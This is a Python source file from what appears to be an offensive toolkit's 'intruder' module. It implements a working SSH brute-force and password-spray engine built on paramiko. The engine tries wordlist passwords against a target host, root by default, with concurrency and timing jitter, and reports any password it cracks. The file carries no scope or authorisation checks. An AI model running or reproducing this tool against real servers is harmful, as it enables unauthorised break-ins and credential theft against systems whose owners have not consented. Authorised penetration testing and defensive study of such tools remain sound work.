"""
engines/intruder/ssh_brute.py
SSHBruteEngine — Paramiko-based SSH brute force and credential spray.
Async concurrent connections with configurable jitter.
"""
import asyncio
import random
import time
from typing import AsyncGenerator, Optional

from engines.base import BaseEngine, HealthStatus, Request, Response, StreamEvent


class SSHBruteEngine(BaseEngine):
    VERSION = "1.0.0"
    TOOL_ID = "ssh_brute"
    CATEGORY = "intruder"

    async def initialize(self) -> None:
        self._ready = True
        self._log("SSHBruteEngine initialized. Paramiko backend ready.")

    async def execute(self, req: Request) -> Response:
        t0 = time.time()
        host = req.target
        port = req.params.get("port", 22)
        user = req.params.get("username", "root")
        wordlist = req.params.get("wordlist", [])
        jitter = req.params.get("jitter_ms", 200)
        threads = req.params.get("threads", 10)
        try:
            result = await self._spray(host, port, user, wordlist, jitter, threads)
            return await self._after(Response(
                request_id=req.id, success=True,
                data=result, elapsed_ms=(time.time() - t0) * 1000,
            ))
        except Exception as exc:
            return await self._on_error(exc, req)

    async def stream(self, req: Request) -> AsyncGenerator[StreamEvent, None]:
        host = req.target
        port = req.params.get("port", 22)
        user = req.params.get("username", "root")
        wordlist = req.params.get("wordlist", ["password", "admin", "root", "123456"])
        jitter = req.params.get("jitter_ms", 150)

        yield StreamEvent(engine_id=self.TOOL_ID, kind="progress",
                          data=f"[SSH] Spraying {host}:{port} as {user} ({len(wordlist)} candidates)...")
        found = None
        for pw in wordlist:
            await asyncio.sleep(jitter / 1000 + random.uniform(0, 0.05))
            success = await asyncio.to_thread(self._try_login, host, port, user, pw)
            if success:
                found = pw
                self._emit("ssh_brute.hit", {"host": host, "user": user, "password": pw}, severity="CRITICAL")
                yield StreamEvent(engine_id=self.TOOL_ID, kind="result",
                                  data={"status": "HIT", "host": host, "user": user, "password": pw},
                                  severity="CRITICAL")
                break
            else:
                yield StreamEvent(engine_id=self.TOOL_ID, kind="progress",
                                  data=f"[SSH] MISS: {user}:{pw}")
        if not found:
            yield StreamEvent(engine_id=self.TOOL_ID, kind="result",
                              data={"status": "EXHAUSTED", "host": host})
        yield StreamEvent(engine_id=self.TOOL_ID, kind="complete")

    def _try_login(self, host: str, port: int, user: str, password: str) -> bool:
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=user, password=password, timeout=3, banner_timeout=5)
            client.close()
            return True
        except Exception:
            return False

    async def _spray(self, host, port, user, wordlist, jitter, threads) -> dict:
        sem = asyncio.Semaphore(threads)
        results = []

        async def attempt(pw):
            async with sem:
                await asyncio.sleep(jitter / 1000 + random.uniform(0, 0.05))
                ok = await asyncio.to_thread(self._try_login, host, port, user, pw)
                results.append({"password": pw, "success": ok})
                return ok

        tasks = [attempt(pw) for pw in wordlist]
        await asyncio.gather(*tasks)
        hits = [r for r in results if r["success"]]
        return {"host": host, "user": user, "total": len(wordlist), "hits": hits}

    def health_check(self) -> HealthStatus:
        try:
            import paramiko  # noqa
            return HealthStatus(engine_id=self.TOOL_ID, status="OK", message="Paramiko available")
        except ImportError:
            return HealthStatus(engine_id=self.TOOL_ID, status="DEGRADED", message="paramiko not installed")
